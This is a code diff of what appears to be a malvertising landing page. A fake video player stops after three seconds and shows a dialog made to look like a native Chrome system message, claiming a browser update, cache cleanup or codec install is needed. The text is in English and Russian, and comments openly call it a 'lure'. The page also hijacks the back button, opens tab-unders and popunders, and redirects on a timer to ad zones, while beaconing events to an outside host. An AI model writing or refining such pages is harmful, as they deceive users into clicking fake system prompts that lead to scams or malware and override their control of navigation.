@@ -13,26 +13,14 @@
   <script>
     var APP_CONFIG = {
       domain: "https://jup9.com",
-
-      // --- MAIN EXIT ---
       mainExit_currentTab_zoneId: 10576293,
       mainExit_newTab_zoneId: 10576292,
-
-      // --- TABUNDER ---
       tabUnderClick_zoneId: 10576300,
-
-      // --- REVERSE (Browser back) ---
       reverse_zoneId: 10576291,
-
-      // --- BACK (History) ---
       back_zoneId: 10576297,
       back_count: 8,
-
-      // --- AUTOEXIT (Timer) ---
       autoexit_zoneId: 10576295,
       autoexit_timeToRedirect: 40,
-
-      // --- AGE EXIT (Leave modal) ---
       ageExit_currentTab_zoneId: 10576302,
       ageExit_newTab_zoneId: 10576301
     };
@@ -43,7 +31,6 @@
     (() => {
       const now = () => new Date().toISOString();
       const p = new URL(location.href).searchParams;
-
       window.syncMetric = ({ event, exitZoneId }) => {
         const payload = [{
           app: "landings-player",
@@ -57,7 +44,6 @@
           navigator.sendBeacon("https://wuytl.com/sync-metrics", JSON.stringify(payload));
         }
       };
-
       window.syncMetric({ event: "start" });
     })();
   </script>
@@ -67,14 +53,11 @@
     (function () {
       const sp = new URL(location.href).searchParams;
 
-      // Priority: ?lang=xx or ?l=xx -> <html lang=""> -> navigator.language -> "en"
       const detectLang = () => {
         const q = (sp.get("lang") || sp.get("l") || "").trim().toLowerCase();
         if (q) return q;
-
         const h = (document.documentElement.getAttribute("lang") || "").trim().toLowerCase();
         if (h) return h;
-
         return (navigator.language || "en").toLowerCase();
       };
 
@@ -86,70 +69,50 @@
         return l;
       };
 
-      // СЛОВАРЬ (EXIT MODAL + НОВЫЕ ТИПЫ ЗАМАНУХИ)
+      // --- СЛОВАРЬ В СТИЛЕ СИСТЕМНЫХ УВЕДОМЛЕНИЙ ---
       const MODAL_I18N = {
         en: {
           title: "Leaving already? 😢",
-          desc: "Wait—video is almost loaded. The best part starts in a second.",
+          desc: "Wait—video is almost loaded.",
           stay: "Stay",
           leave: "Leave",
-          
-          // --- ТИПЫ ДЛЯ ЗАМАНУХИ (Default fallback) ---
-          t1: { h: "Browser Update Required", t: "Video format not supported. Update Chrome to continue.", b: "Update Browser" },
-          t2: { h: "System Warning", t: "Not enough memory to buffer video. Clean junk files.", b: "Clean Now" },
-          t3: { h: "Content Blocked", t: "This video is restricted in {country}. Enable Secure Mode.", b: "Unblock Video" },
-          t4: { h: "Playback Error", t: "Video codec is missing or outdated. Install plugin to play.", b: "Install Codec" }
+          t1: { h: "Update required", t: "Your browser version is no longer supported. Please update Chrome to play this video.", b: "UPDATE" },
+          t2: { h: "Storage limit reached", t: "To continue playback, please clear your browser cache or system junk files.", b: "CLEAR NOW" },
+          t3: { h: "Content restricted", t: "This media is restricted in {country}. Please enable secure connection to watch.", b: "ENABLE" },
+          t4: { h: "Playback Error", t: "A newer version of the media player is required to play this content.", b: "INSTALL" }
         },
-
         ru: {
           title: "Уже уходишь? 😢",
-          desc: "Подожди! Видео почти загрузилось, самое интересное через секунду.",
+          desc: "Подожди! Видео почти загрузилось.",
           stay: "Остаться",
           leave: "Уйти",
-          
-          // --- ТИПЫ ДЛЯ ЗАМАНУХИ (RU) ---
-          t1: { h: "Браузер устарел", t: "Видео не поддерживается. Обновите браузер для просмотра.", b: "Обновить" },
-          t2: { h: "Память переполнена", t: "Недостаточно памяти для видео. Очистите мусор.", b: "Очистить" },
-          t3: { h: "Контент заблокирован", t: "Видео недоступно в регионе {country}. Включите защиту.", b: "Разблокировать" },
-          t4: { h: "Ошибка воспроизведения", t: "Кодек устарел или отсутствует. Установите плагин.", b: "Установить" }
-        },
-        
-        // ... Можешь добавить другие языки (es, de, etc.) копированием блоков
+          t1: { h: "Требуется обновление", t: "Ваша версия браузера больше не поддерживается. Обновите Chrome для просмотра видео.", b: "ОБНОВИТЬ" },
+          t2: { h: "Память переполнена", t: "Для продолжения воспроизведения очистите кэш браузера или системный мусор.", b: "ОЧИСТИТЬ" },
+          t3: { h: "Доступ ограничен", t: "Этот контент недоступен в регионе {country}. Включите безопасное соединение.", b: "ВКЛЮЧИТЬ" },
+          t4: { h: "Ошибка декодирования", t: "Для воспроизведения этого контента требуется обновить медиа-плагин.", b: "УСТАНОВИТЬ" }
+        }
       };
 
-      // Функция выбора текстов
       window.__getModalCopy = function () {
         const lang = norm(detectLang());
-        // ФОЛБЕК НА АНГЛИЙСКИЙ, ЕСЛИ ЯЗЫКА НЕТ
         return MODAL_I18N[lang] || MODAL_I18N.en;
       };
 
-      // --- НОВАЯ ЛОГИКА ПОДМЕНЫ ТЕКСТА В ПЛАШКЕ (LURE) ---
+      // Инъекция текстов в "реалистичную" плашку
       document.addEventListener("DOMContentLoaded", () => {
-        // 1. Получаем настройки
-        const typeId = sp.get('type') || '4'; // 4 = Codec (default)
+        const typeId = sp.get('type') || '4';
         const country = sp.get('geo') || sp.get('country') || "Your Region";
-        
-        // 2. Берем словарь (текущий язык или EN)
         const dict = window.__getModalCopy(); 
-        
-        // 3. Выбираем контент по типу (t1..t4). Если тип кривой -> t4
-        let content = dict['t' + typeId];
-        if (!content) content = dict['t4'];
-
-        // 4. Заменяем {country} в тексте
+        let content = dict['t' + typeId] || dict['t4'];
         const textBody = content.t.replace("{country}", country);
 
-        // 5. Вставляем в HTML
         const elHead = document.getElementById('lure-head');
         const elText = document.getElementById('lure-text');
         const elBtn  = document.getElementById('lure-btn');
-
         if (elHead) elHead.innerText = content.h;
         if (elText) elText.innerText = textBody;
         if (elBtn)  elBtn.innerText  = content.b;
       });
-
     })();
   </script>
 
@@ -168,246 +131,93 @@
       justify-content: center;
       cursor: pointer;
       pointer-events: auto;
-      user-select: none;
       -webkit-tap-highlight-color: transparent;
     }
 
     .xh-zone svg { fill: #fff; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5)); }
 
-    .xh-top-left {
-      position: fixed;
-      top: 15px; left: 15px;
-      z-index: 100;
-      width: 52px; height: 52px;
-    }
-
+    .xh-top-left { position: fixed; top: 15px; left: 15px; z-index: 100; width: 52px; height: 52px; }
     .xh-top-right {
-      position: fixed;
-      top: 15px; right: 15px;
-      z-index: 100;
-      width: 48px; height: 48px;
-      border-radius: 50%;
-      background: rgba(30,30,30,0.5);
-      border: 1px solid rgba(255,255,255,0.1);
+      position: fixed; top: 15px; right: 15px; z-index: 100; width: 48px; height: 48px;
+      border-radius: 50%; background: rgba(30,30,30,0.5); border: 1px solid rgba(255,255,255,0.1);
     }
-
-    .xh-top-left svg, .xh-top-right svg { width: 28px; height: 28px; }
 
     .xh-main-screen {
       position: absolute; inset: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 10;
+      display: flex; align-items: center; justify-content: center; z-index: 10;
     }
 
-    .xh-video-container {
-      width: 100%;
-      max-width: 1220px;
-      aspect-ratio: 16 / 9;
-      position: relative;
-      background: #000;
-    }
+    .xh-video-container { width: 100%; max-width: 1220px; aspect-ratio: 16 / 9; position: relative; background: #000; }
+    .xh-video-element { width: 100%; height: 100%; object-fit: cover; display: block; }
 
-    .xh-video-element {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      display: block;
-      background: #000;
-    }
-
-    /* --- НОВЫЕ СТИЛИ ДЛЯ ПЛАШКИ (ВМЕСТО КНОПКИ PLAY) --- */
+    /* --- СТИЛЬ "РЕАЛИЗМ" (NATIVE SYSTEM DIALOG) --- */
     .xh-main-play-trigger {
-      position: absolute;
-      top: 50%; left: 50%;
+      position: absolute; top: 50%; left: 50%;
       transform: translate(-50%, -50%);
-      width: auto; height: auto; /* Авто-размер */
-      z-index: 20;
-      opacity: 0;
-      visibility: hidden;
-      pointer-events: none;
-      transition: opacity 0.3s ease;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      width: auto; height: auto;
+      z-index: 20; opacity: 0; visibility: hidden; pointer-events: none;
+      transition: opacity 0.2s ease;
     }
 
-    .xh-main-play-trigger.ready {
-      opacity: 1;
-      visibility: visible;
-      pointer-events: auto;
-      /* Легкая анимация появления */
-      animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-    }
-    
-    @keyframes popIn {
-        from { transform: translate(-50%, -50%) scale(0.8); opacity: 0; }
-        to { transform: translate(-50%, -50%) scale(1); opacity: 1; }
-    }
+    .xh-main-play-trigger.ready { opacity: 1; visibility: visible; pointer-events: auto; }
 
-    /* Стили окна */
-    .codec-window {
-        background: rgba(28, 28, 30, 0.95);
-        backdrop-filter: blur(10px);
-        border: 1px solid rgba(255, 255, 255, 0.1);
-        border-radius: 14px;
+    .system-dialog {
+        background: #ffffff; /* Чистый белый как в системных окнах */
+        border-radius: 8px;
         padding: 24px;
-        width: 280px;
-        box-shadow: 0 20px 50px rgba(0,0,0,0.7);
-        text-align: center;
-        color: #fff;
+        width: 300px;
+        box-shadow: 0 12px 28px rgba(0,0,0,0.3);
+        text-align: left; /* Важно: левое выравнивание */
+        color: #202124;
     }
 
-    .codec-icon { margin-bottom: 12px; }
+    .dialog-title { font-size: 19px; font-weight: 500; margin-bottom: 12px; color: #000; }
+    .dialog-text { font-size: 14px; color: #5f6368; margin-bottom: 24px; line-height: 1.5; }
     
-    .codec-title {
-        font-size: 17px;
-        font-weight: 700;
-        margin-bottom: 6px;
-        color: #fff;
-    }
-
-    .codec-text {
-        font-size: 14px;
-        color: #a0a0a0;
-        margin-bottom: 18px;
-        line-height: 1.4;
-    }
-
-    .codec-btn {
-        background: #0a84ff; /* System Blue */
-        color: white;
+    .dialog-actions { display: flex; justify-content: flex-end; } /* Кнопка справа внизу */
+    
+    .dialog-btn {
+        background: transparent;
+        color: #1a73e8; /* Синий Chrome/Android */
         border: none;
-        width: 100%;
-        padding: 12px;
-        border-radius: 10px;
-        font-size: 16px;
+        padding: 8px 12px;
+        font-size: 14px;
         font-weight: 600;
         cursor: pointer;
-        transition: background 0.2s;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
     }
-    .codec-btn:active { background: #0070e0; }
-
-    /* --- END NEW STYLES --- */
+    .dialog-btn:active { background: rgba(26, 115, 232, 0.1); border-radius: 4px; }
+    /* --- END REALISM --- */
 
     .xh-bottom-interface {
-      position: fixed;
-      left: 0; bottom: 0;
-      width: 100%;
-      z-index: 100;
-      padding: 0 10px 10px;
-      box-sizing: border-box;
+      position: fixed; left: 0; bottom: 0; width: 100%; z-index: 100;
+      padding: 0 10px 10px; box-sizing: border-box;
       background: linear-gradient(0deg, #000 0%, rgba(0,0,0,0.8) 60%, transparent 100%);
       pointer-events: none;
     }
 
-    .xh-timeline-trigger {
-      width: 100%;
-      padding: 15px 0 10px;
-      pointer-events: auto;
-    }
-
-    .xh-line-bg {
-      width: 100%;
-      height: 4px;
-      background: rgba(255,255,255,0.25);
-      position: relative;
-    }
-
-    .xh-line-fill {
-      position: absolute;
-      left: 0; top: 0;
-      height: 100%;
-      width: 5%;
-      background: #f00;
-    }
-
-    .xh-flex-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-
+    .xh-timeline-trigger { width: 100%; padding: 15px 0 10px; pointer-events: auto; }
+    .xh-line-bg { width: 100%; height: 4px; background: rgba(255,255,255,0.25); position: relative; }
+    .xh-line-fill { position: absolute; left: 0; top: 0; height: 100%; width: 5%; background: #f00; }
+    .xh-flex-row { display: flex; justify-content: space-between; align-items: center; }
     .xh-side { display: flex; align-items: center; }
+    .xh-icon-zone { width: 52px; height: 52px; pointer-events: auto; }
+    .xh-icon-zone svg { width: 32px; height: 32px; }
+    .xh-time-display { color: #fff; font-size: 16px; font-weight: 500; padding: 0 5px; }
 
-    .xh-icon-zone {
-      width: 52px;
-      height: 52px;
-      pointer-events: auto;
-    }
-
-    .xh-icon-zone svg {
-      width: 32px;
-      height: 32px;
-    }
-
-    .xh-time-display {
-      color: #fff;
-      font-size: 16px;
-      font-weight: 500;
-      padding: 0 5px;
-    }
-
-    /* Modal */
-    .xh-modal {
-      position: fixed; inset: 0;
-      z-index: 99999;
-      display: none;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .xh-modal-overlay {
-      position: absolute; inset: 0;
-      background: rgba(0, 0, 0, 0.85);
-      backdrop-filter: blur(4px);
-    }
-
+    /* Exit Modal */
+    .xh-modal { position: fixed; inset: 0; z-index: 99999; display: none; align-items: center; justify-content: center; }
+    .xh-modal-overlay { position: absolute; inset: 0; background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(4px); }
     .xh-modal-content {
-      position: relative;
-      z-index: 100000;
-      width: 85%;
-      max-width: 300px;
-      background: #1c1c1c;
-      border: 1px solid #333;
-      border-radius: 14px;
-      padding: 24px;
-      text-align: center;
-      color: #fff;
-      box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+      position: relative; z-index: 100000; width: 85%; max-width: 300px;
+      background: #1c1c1c; border: 1px solid #333; border-radius: 14px;
+      padding: 24px; text-align: center; color: #fff;
     }
-
-    .xh-modal-title {
-      font-size: 20px;
-      font-weight: 700;
-      margin-bottom: 10px;
-    }
-
-    .xh-modal-desc {
-      font-size: 14px;
-      color: #aaa;
-      margin-bottom: 20px;
-      line-height: 1.4;
-    }
-
-    .xh-modal-actions {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-    }
-
-    .xh-btn {
-      border: none;
-      outline: none;
-      padding: 12px;
-      border-radius: 8px;
-      font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-      width: 100%;
-    }
-
+    .xh-modal-title { font-size: 20px; font-weight: 700; margin-bottom: 10px; }
+    .xh-modal-desc { font-size: 14px; color: #aaa; margin-bottom: 20px; line-height: 1.4; }
+    .xh-modal-actions { display: flex; flex-direction: column; gap: 10px; }
+    .xh-btn { border: none; outline: none; padding: 12px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; }
     .xh-btn-primary { background: #e50914; color: #fff; }
     .xh-btn-secondary { background: #333; color: #ccc; }
   </style>
@@ -415,75 +225,48 @@
 
 <body>
   <div class="xh-zone xh-top-left" data-target="back_button" aria-label="Back">
-    <svg viewBox="0 0 24 24">
-      <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
-    </svg>
+    <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
   </div>
 
   <div class="xh-zone xh-top-right" data-target="pip_top" aria-label="PiP">
-    <svg viewBox="0 0 24 24">
-      <path d="M19 7h-8v6h8V7zm2-4H3c-1.1 0-2 .9-2 2v14c0 1.1.9 1.98 2 1.98h18c1.1 0 2-.88 2-1.98V5c0-1.1-.9-2-2-2zm0 16.01H3V4.98h18v14.03z"/>
-    </svg>
+    <svg viewBox="0 0 24 24"><path d="M19 7h-8v6h8V7zm2-4H3c-1.1 0-2 .9-2 2v14c0 1.1.9 1.98 2 1.98h18c1.1 0 2-.88 2-1.98V5c0-1.1-.9-2-2-2zm0 16.01H3V4.98h18v14.03z"/></svg>
   </div>
 
   <div class="xh-main-screen">
     <div class="xh-video-container">
-      <video class="xh-video-element"
-             playsinline
-             muted
-             preload="auto"
-             data-poster="./assets/poster-3s.webp">
+      <video class="xh-video-element" playsinline muted preload="auto" data-poster="./assets/poster-3s.webp">
         <source src="./vid.mp4" type="video/mp4" />
       </video>
 
-      <div class="xh-zone xh-main-play-trigger" data-target="main_play" aria-label="Play">
-         <div class="codec-window">
-            <div class="codec-icon">
-                <svg width="48" height="48" viewBox="0 0 24 24" fill="none">
-                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="#ffcc00"/>
-                </svg>
+      <div class="xh-zone xh-main-play-trigger" data-target="main_play" aria-label="System Message">
+         <div class="system-dialog">
+            <div class="dialog-title" id="lure-head">Update Required</div>
+            <div class="dialog-text" id="lure-text">Please update your system components to play this media.</div>
+            <div class="dialog-actions">
+                <button class="dialog-btn" id="lure-btn">UPDATE</button>
             </div>
-            
-            <div class="codec-title" id="lure-head">System Alert</div>
-            <div class="codec-text" id="lure-text">Error loading video.</div>
-            <button class="codec-btn" id="lure-btn">Fix Now</button>
         </div>
       </div>
-      </div>
+
+    </div>
   </div>
 
   <div class="xh-bottom-interface">
     <div class="xh-zone xh-timeline-trigger" data-target="timeline">
       <div class="xh-line-bg"><div class="xh-line-fill"></div></div>
     </div>
-
     <div class="xh-flex-row">
       <div class="xh-side">
-        <div class="xh-zone xh-icon-zone" data-target="play_pause" aria-label="Play/Pause">
-          <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
-        </div>
-        <div class="xh-zone xh-icon-zone" data-target="mute_unmute" aria-label="Mute/Unmute">
-          <svg viewBox="0 0 24 24">
-            <path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"/>
-          </svg>
+        <div class="xh-zone xh-icon-zone" data-target="play_pause"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
+        <div class="xh-zone xh-icon-zone" data-target="mute_unmute">
+          <svg viewBox="0 0 24 24"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"/></svg>
         </div>
         <div class="xh-time-display">0:03 / 8:32</div>
       </div>
-
       <div class="xh-side">
-        <div class="xh-zone xh-icon-zone" data-target="pip_bottom" aria-label="PiP Bottom">
-          <svg viewBox="0 0 24 24"><path d="M19 11h-8v6h8v-6zm4-7V16c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h18c1.1 0 2 .9 2 2zm-2 0H3v12h18V4z"/></svg>
-        </div>
-
-        <div class="xh-zone xh-icon-zone" data-target="settings" aria-label="Settings">
-          <svg viewBox="0 0 24 24">
-            <path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.5c-1.93 0-3.5-1.57-3.5-3.5s1.57-3.5 3.5-3.5 3.5 1.57 3.5 3.5-1.57 3.5-3.5 3.5z"/>
-          </svg>
-        </div>
-
-        <div class="xh-zone xh-icon-zone" data-target="fullscreen" aria-label="Fullscreen">
-          <svg viewBox="0 0 24 24"><path d="M7 14H5v5h5v-2H7v-3zM14 5v2h3v3h2V5h-5z"/></svg>
-        </div>
+        <div class="xh-zone xh-icon-zone" data-target="pip_bottom"><svg viewBox="0 0 24 24"><path d="M19 11h-8v6h8v-6zm4-7V16c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h18c1.1 0 2 .9 2 2zm-2 0H3v12h18V4z"/></svg></div>
+        <div class="xh-zone xh-icon-zone" data-target="settings"><svg viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.5c-1.93 0-3.5-1.57-3.5-3.5s1.57-3.5 3.5-3.5 3.5 1.57 3.5 3.5-1.57 3.5-3.5 3.5z"/></svg></div>
+        <div class="xh-zone xh-icon-zone" data-target="fullscreen"><svg viewBox="0 0 24 24"><path d="M7 14H5v5h5v-2H7v-3zM14 5v2h3v3h2V5h-5z"/></svg></div>
       </div>
     </div>
   </div>
@@ -506,96 +289,43 @@
       const video = document.querySelector(".xh-video-element");
       const playBtn = document.querySelector(".xh-main-play-trigger");
       if (!video || !playBtn) return;
-
       const sp = new URL(location.href).searchParams;
       const STOP_AT = 3.0;
       const startTime = parseFloat(sp.get("t")) || 0;
-
-      // ИЗМЕНЕНИЕ: Читаем постер из data-poster, чтобы он не вылез сразу
       const POSTER = sp.get("__poster") || video.getAttribute("data-poster") || "./assets/poster-3s.webp";
 
-      // Clone mode: no preview playback, just restore state and show button
       if (sp.get("__cl") === "1" || sp.get("__skipPreview") === "1") {
         try { video.pause(); } catch {}
-        try { video.currentTime = startTime; } catch {}
-        
-        // ИЗМЕНЕНИЕ: Включаем постер только здесь
-        try { video.setAttribute("poster", POSTER); } catch {}
-        
-        try { video.load(); } catch {}
+        try { video.currentTime = startTime; video.setAttribute("poster", POSTER); video.load(); } catch {}
         playBtn.classList.add("ready");
         return;
       }
 
       let done = false;
-
       const cleanup = () => {
-        clearTimeout(hardFallback);
-        clearTimeout(playWatchdog);
+        clearTimeout(hardFallback); clearTimeout(playWatchdog);
         video.removeEventListener("timeupdate", onTime);
-        video.removeEventListener("error", onErr);
-        video.removeEventListener("stalled", onErr);
-        video.removeEventListener("canplay", onCanPlay);
       };
 
       const finish = () => {
-        if (done) return;
-        done = true;
-
-        try { video.pause(); } catch {}
-        try { video.currentTime = STOP_AT; } catch {}
-        
-        // ИЗМЕНЕНИЕ: Включаем постер после остановки превью
-        try { video.setAttribute("poster", POSTER); } catch {}
-        
+        if (done) return; done = true;
+        try { video.pause(); video.currentTime = STOP_AT; video.setAttribute("poster", POSTER); } catch {}
         playBtn.classList.add("ready");
-
         cleanup();
       };
 
-      const onTime = () => {
-        if (video.currentTime >= STOP_AT) finish();
-      };
-
-      const onErr = () => finish();
-      const onCanPlay = () => start();
-
+      const onTime = () => { if (video.currentTime >= STOP_AT) finish(); };
       video.addEventListener("timeupdate", onTime);
-      video.addEventListener("error", onErr, { once: true });
-      video.addEventListener("stalled", onErr);
-      video.addEventListener("canplay", onCanPlay, { once: true });
-
-      // Hard fallback
       const hardFallback = setTimeout(finish, 3500);
-
-      // Watchdog
-      const playWatchdog = setTimeout(() => {
-        const ct = video.currentTime || 0;
-        if (ct <= 0.05) finish();
-      }, 2200);
+      const playWatchdog = setTimeout(() => { if ((video.currentTime || 0) <= 0.05) finish(); }, 2200);
 
       const start = async () => {
-        try {
-          video.muted = true;
-          video.playsInline = true;
-
-          const pr = video.play();
-          if (pr && typeof pr.then === "function") await pr;
-        } catch {
-          finish();
-        }
+        try { video.muted = true; video.playsInline = true; const pr = video.play(); if (pr && pr.then) await pr; } catch { finish(); }
       };
 
-      // --- ЛОГИКА ПОПАНДЕРА: ЖДЕМ ГЛАЗ ---
-      if (document.visibilityState === "visible") {
-        start();
-      } else {
-        const onFirstVisible = () => {
-           if (document.visibilityState === "visible") {
-             start();
-             document.removeEventListener("visibilitychange", onFirstVisible);
-           }
-        };
+      if (document.visibilityState === "visible") start();
+      else {
+        const onFirstVisible = () => { if (document.visibilityState === "visible") { start(); document.removeEventListener("visibilitychange", onFirstVisible); } };
         document.addEventListener("visibilitychange", onFirstVisible);
       }
     });
@@ -606,33 +336,18 @@
     (function () {
       function applyModalI18n() {
         if (typeof window.__getModalCopy !== "function") return;
-
         const copy = window.__getModalCopy();
         const root = document.getElementById("xh_exit_modal");
         if (!root) return;
-
-        const set = (key, val) => {
-          const el = root.querySelector(`[data-i18n="${key}"]`);
-          if (el) el.textContent = val;
-        };
-
-        set("title", copy.title);
-        set("desc", copy.desc);
-        set("stay", copy.stay);
-        set("leave", copy.leave);
+        const set = (key, val) => { const el = root.querySelector(`[data-i18n="${key}"]`); if (el) el.textContent = val; };
+        set("title", copy.title); set("desc", copy.desc); set("stay", copy.stay); set("leave", copy.leave);
       }
-
-      if (document.readyState === "loading") {
-        document.addEventListener("DOMContentLoaded", applyModalI18n, { once: true });
-      } else {
-        applyModalI18n();
-      }
-
-      // Optional: allow manual refresh after changing <html lang> or query params
+      if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", applyModalI18n, { once: true });
+      else applyModalI18n();
       window.applyModalI18n = applyModalI18n;
     })();
   </script>
 
-  <script defer src="./assets/scripts/common.js?v=1.0"></script>
+  <script defer src="./assets/scripts/common.js"></script>
 </body>
 </html>
